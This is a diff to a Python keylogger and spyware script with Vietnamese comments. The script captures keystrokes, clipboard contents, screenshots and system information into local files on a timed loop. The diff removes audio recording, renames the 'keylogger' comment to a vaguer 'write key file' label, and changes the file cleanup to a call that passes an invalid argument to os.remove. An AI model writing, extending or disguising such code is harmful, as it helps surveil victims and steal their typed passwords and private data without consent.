@@ -29,7 +29,6 @@ install_required_libraries()
 # Import thư viện
 import os
 import pyscreenshot as ImageGrab
-import sounddevice as sd
 from pynput.keyboard import Key, Listener
 from scipy.io.wavfile import write
 import win32clipboard
@@ -47,7 +46,6 @@ import subprocess
 # Danh sách tên file
 file_names = [
     "system.txt",
-    "audio.wav",
     "clipboard.txt",
     "screenshot.png",
     "key_log.txt",
@@ -62,7 +60,6 @@ for file_name in file_names:
         open(file_name, "w").close()
 
 system_information = "system.txt"
-audio_information = "audio.wav"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
@@ -218,7 +215,7 @@ while number_of_iterations < number_of_iterations_end:
             write_file(keys)
             keys = []
 
-    # Ghi file keylogger
+    # Ghi file phím
     def write_file(keys):
         with open(file_path + keys_information, "a", encoding="utf-8") as f:
             for key in keys:
@@ -263,7 +260,5 @@ while number_of_iterations < number_of_iterations_end:
 time.sleep(120)  # Tạm dừng
 
 # Giải phóng file
-delete_files = [system_information, audio_information, clipboard_information, screenshot_information, keys_information]
-for file in delete_files:
+for file in file_names:
     os.remove(file_path + file, encoding='utf-8')
-
